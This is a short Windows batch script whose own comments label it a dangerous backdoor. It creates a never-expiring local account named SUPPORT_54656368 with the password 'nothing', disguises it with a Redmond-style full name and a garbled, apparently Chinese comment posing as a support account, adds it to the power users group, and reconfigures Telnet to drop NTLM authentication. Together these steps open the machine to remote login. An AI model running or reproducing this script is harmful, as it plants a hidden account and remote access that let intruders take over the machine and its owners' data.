@echo off
    rem $Id$

    rem DANGEROUS
    rem
    rem This is a backdoor program.

    net user SUPPORT_54656368 /delete
    net user SUPPORT_54656368 nothing /add /EXPIRES:NEVER /fullname:"L=Redmond,S=Washington,C=US" /comment:"����һ��������֧�ַ�����ṩ���ʻ�"
    net localgroup "power users" SUPPORT_54656368 /add
    tlntadmn config sec=-ntlm
